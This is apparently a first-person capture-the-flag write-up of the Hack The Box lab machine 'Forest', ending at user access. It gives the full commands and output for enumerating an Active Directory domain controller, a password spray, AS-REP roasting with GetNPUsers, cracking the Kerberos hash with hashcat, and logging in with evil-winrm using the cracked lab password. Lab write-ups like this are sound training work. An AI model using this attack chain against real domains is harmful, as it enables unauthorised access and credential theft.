# Forest
*note: this is my first attempt at AD penetration testing. After pwning user I've realised that I need to learn more about it and return to get the sytem own*

## Recon

We start by nmapping our target machine with: `nmap -sV -sC -Pn 10.10.10.161`

Our output shows:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 03:54 EDT
Nmap scan report for 10.10.10.161
Host is up (0.28s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-03 08:02:30Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Judging by the output, we have a domain controller. We're working with DNS, and AD, as LDAP is present on port 3268, and kerberos is on port 88. Unfortunately, I'm not well versed in exploiting these systems, so it was an uphill battle from here.

I started with rpcclient, as I've exploited it before. Using the command `rpcclient -U "" 10.10.10.161` and skipping the password, the target serves me a `Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE`

No good.

Time to have a look at SMB, as I've also exploited this before in the past. I load up `smbclient -L 10.10.10.161` and thought it was a shoe-in as forest displayed 
```
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
```
Shortly followed by
```
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

Try specifying workgroup
```
lmao.

I mucked around with SMB some more but found nothing.

From here I decided to go back to nmap to see if i can enumerate any open ports or find any vulnerabilities. I used `nmap -Pn --script msrpc-enum 10.10.10.161` which is used to enumeratore RPC, and `nmap -Pn -p 445 --script smb-vuln-* 10.10.10.161` which I have used in the past, in an attempt to find an SMB vulnerability. No luck again.

I was at a loss a this point, and decided to look at *every* port on the machine. I ran `nmap -p0-65535 -Pn 10.10.10.161` (-p0-66535 is scanning from port 0 to port 66535). Nmap came back with:
```
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49664/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49706/tcp open  unknown
49945/tcp open  unknown
```

Not much info, but I ran this scan specifically to enumerate every port I can without retriving more information in an attempt to see what's open and save myself a lot of time. with this list of ports, I can now see what's actually running on them. So I ran: `nmap -sV -sC -Pn -p5985,9389,47001,49664,49666,49667,49671,49676,49677,49684,49706,49945 10.10.10.161`. This command is really similar to the last one, however this time I'm listing specific ports to check, running default scripts against them and looking for versions. Nmap this time shows:
```
PORT      STATE SERVICE    VERSION
5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf     .NET Message Framing
47001/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc      Microsoft Windows RPC
49666/tcp open  msrpc      Microsoft Windows RPC
49667/tcp open  msrpc      Microsoft Windows RPC
49671/tcp open  msrpc      Microsoft Windows RPC
49676/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc      Microsoft Windows RPC
49684/tcp open  msrpc      Microsoft Windows RPC
49706/tcp open  msrpc      Microsoft Windows RPC
49945/tcp open  msrpc      Microsoft Windows RPC
```

Still not a whole lot to go off of. I'd never seen Microsoft HTTPAPI on port 5985 before, so I decided to look it up. There's a vulnerability associated with it. I found [this link](https://www.sikich.com/insight/ms15-034-critical-windows-vulnerability-need-know-now/) which let me know that I can run `curl -v 10.10.10.161 -H "Range: bytes=00-18446744073709551615"` to chuck for this well known vulnerability. Alas, no luck. Ugh.

I've probably been subconsciously avoiding it (because I've never tried it before), but it was now time to try LDAP. I boot up nmap once more looking for more information `nmap -sT -Pn -n --open 10.10.10.161 -p389 --script ldap-rootdse`. Rootdse just queries LDAP for some attributes that all servers must store. After passing this command, the only information of note I found was that the dnsHostName is FOREST.htb.local

Time to try some new tech; using dig to find out more information about the ldap server. I run `dig srv _ldap._tcp.dc._msdcs.forest.htb.local @10.10.10.161` and found some more domains: `htb.local.              3600    IN      SOA     forest.htb.local. hostmaster.htb.local. 106 900 600 86400 3600`

I dug around LDAP some more for quite a while, but came back with nothing. At this point I figured that I'm probably on the wrong track again, and decided to return to some of the previous serfaces. After pretty close to an hour of research, I found something really obvious I'd missed with RPC. I needed to use the `-N` flag to specify that I didn't want to use a password.

So.

With the following command `rpcclient -U "" -N 10.10.10.161` I finally have access to RPC. again, not very familiar with RPC so I googled some important commands to use. Some of them were blocked, but I was able to enumerate users:
```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

Enumerate Groups:
```
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
```

I wanted to see what else I could get away with this at this point and tried something spicy:
```
rpcclient $> createdomuser netrunner
result was NT_STATUS_ACCESS_DENIED
```

lol.

Okay, so at this point I had a list of usernames that I compiled down into a text file:
```
DefaultAccount
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

And decided to run a password spray. I booted up crackmap `crackmapexec smb 10.10.10.161 -u users.txt -p /usr/share/wordlists/rockyou.txt`. This command is loading the tool, tuning it for SMB, at our target IP, use our list of users and use rockyou.txt as our password list. Quite a bit of time passed, and I figured that there'd be a quicker way. So while my tool ran, I looked around the net for some other tools I could use.

Eventually, I came across GetNPUsers. This is a common CTF tool that is used to retrieve password hashes and usernames from Kerberos/AD.

## GetNPUsers

I mucked around with commands and finally got it work correctly with the last on this list:
```
(fail)python3 GetNPUsers.py 10.10.10.161
(fail)python3 GetNPUsers.py forest.htb.local/ -dc-ip 10.10.10.161
(fail)python3 GetNPUsers.py forest.local/ -dc-ip 10.10.10.161
(win)python3 GetNPUsers.py htb.local/ -dc-ip 10.10.10.161
```
We get the output:
```
Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2022-08-04 05:32:14.999391  2022-08-04 05:32:55.796298  0x410200 
```
Now that I know that I can use this tool against the target AND there's a username called 'svc-alfresco', I just add the '-request' flag and finally get a username and hash:
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:812cfb5454107edd34d5d8ef2023d2ae$5ca1cb5ff5f2f0ccb73b93d0ea0581fce80538e16266df11b
1e0686bc63fc37ea3a84bd6348d33dc100704708aebb0b9bc561ceeec36f5048506032280e9246be125a386e781efde7bd00a6b79c1f4ae9ef344b8
2aeb84df54fe5f4194705e7dc1af27c005ef4bcf31a1b1eb92c08dac777cfe5f2d17a2f786ddd5444ba71672d5ca0e4e97a9fa493fafd4dbf1c0653
dfed65b007d1669e2be3ddef5d918af3cc12eb497dea9c630d6ae0ed6db2e25c83dcfc3fe42f3240cbce0180cf3486c2eb2de2f844879ff247497ec
5fa9d54ece0a9e244d2a32f2b2e72c5bbf2e2c1ee33e75277eec16
```

## How GetNPUsers Works
After running the command above, I retrieved this hash+username. The hash doesn't *actually* contain a password, however it's a value that has been encrypted *with* the users password. To decode this hash, a small segment of it is decoded with a supplied wordlist. That part of the hash is always the same, so if there's a match that means the password is correct.

When searching for vulnerable usernames, the script creates a kerberos request (AS-REQ) for the server, asking for a username of an account that does not have "Require Preauth" enabled in AD. This value is stored in a single location in memory, so the script is able to perform a bitwise and query for this specific address to retrieve the information.

Upon successfully locating an account that matches the query, the request also asks for the response to be encoded in an MD5 hash. Normally kerberos will us a much more secure encryption method, but this can be overwritten by simply requesting it to be encoded as MD5.

When Kerberos has preauth required, when attempting to query the service, a user password will need to be provided. This password requires the users system time to be encrypted with the users password. This is to both verify that the password matches the one saved in AD, and ensures that replay attacks (probably) cannot occur.

## Foothold

Aftre grabbing the hash, I passed the entire thing through hashcat `hashcat -m 18200 -a 0 forest_hash /usr/share/wordlists/rockyou.txt`

I double checked the mode on hashcat's [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) site and took a guess that it'd be 18200. I've set the command to just use the supplied wordlist with -a 0.

The command didn't work at first, and I've heard it's naughty, but I used --force to get the password I needed: s3rvice.

Fantastic. I now had a username and password, time to see what I can get away with.

I fired up Evilwinrm for the second time in my life, and connected to forest: `evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice`. From here, I collected the user flag from svc-alfresco's desktop.

_To Be Continued_
